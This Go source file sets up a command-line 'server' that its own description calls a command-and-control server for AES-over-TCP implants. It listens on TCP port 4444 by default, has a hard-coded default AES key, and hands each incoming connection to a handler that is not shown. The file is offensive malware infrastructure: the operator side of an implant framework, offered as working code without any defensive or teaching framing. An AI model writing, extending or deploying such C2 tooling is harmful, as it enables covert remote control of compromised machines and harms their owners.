package cmd

import (
	"fmt"
	"net"
	"os"

	"github.com/spf13/cobra"
)

type CliOptions struct {

	// Port to listen on
	Lport int

	// Enable debug trace
	DebugEnabled bool

	// AES-key to use for communications
	AesKey string
}

func CliDefaults() *CliOptions {

	return &CliOptions{
		Lport:        4444,
		DebugEnabled: false,
		AesKey:       "RAZINrazinRAZINrazinRAZINrazinRAZINraz",
	}
}

func LoadServerCLI() *cobra.Command {

	opts := CliDefaults()

	version := "0.0.1"
	var cmd = &cobra.Command{
		Use:                "server",
		Version:            version,
		DisableSuggestions: true,
		Short:              "AES-over-TCP server",
		Long:               "Command-and-control server for AES-over-TCP implants",
		Run: func(cmd *cobra.Command, args []string) {

			if opts.DebugEnabled == true {
				fmt.Println("[~] Setting up server...")
			}

			/* setting up listener */
			connexion, err := net.Listen("tcp", fmt.Sprintf(":%d", opts.Lport))
			if err != nil {
				fmt.Printf("[!] Cannot listen on port %d: %s\n", opts.Lport, err.Error())
				os.Exit(1)
			}
			defer connexion.Close()

			/* wait for new connections */
			for {

				conn, err := connexion.Accept()
				if err != nil {
					fmt.Printf("[!] Error accepting connexion: %s\n", err.Error())
					continue
				}

				/* call go handler in co-routine */
				go handleClient(opts, conn)
			}
		},
	}

	cmd.PersistentFlags().BoolVarP(&opts.DebugEnabled, "debug", "d", false, "enable debug trace")
	cmd.PersistentFlags().IntVarP(&opts.Lport, "port", "p", 4444, "server listening port")
	cmd.PersistentFlags().StringVarP(&opts.AesKey, "key", "k", opts.AesKey, "AES key for communications")

	return cmd
}
